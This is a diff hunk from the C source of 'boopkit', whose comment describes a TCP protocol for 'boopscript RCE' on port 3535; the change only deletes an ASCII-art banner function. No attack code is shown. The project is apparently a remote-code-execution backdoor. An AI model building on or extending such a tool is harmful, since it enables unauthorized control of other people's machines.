@@ -44,18 +44,6 @@ struct tcp_return {
 // PORT for the boopkit TCP protocol for boopscript RCE
 #define PORT 3535
 
-// asciiheader is the main runtime banner.
-void asciiheader() {
-  printf("\n\n");
-  printf("   ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\n");
-  printf("   ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\n");
-  printf("   ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \n");
-  printf("   ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \n");
-  printf("   ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \n");
-  printf("   ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \n");
-  printf("\n\n");
-}
-
 // MAX_DENY_ADDRS is the maximum amount of address that can be denied.
 #define MAX_DENY_ADDRS 1024
 
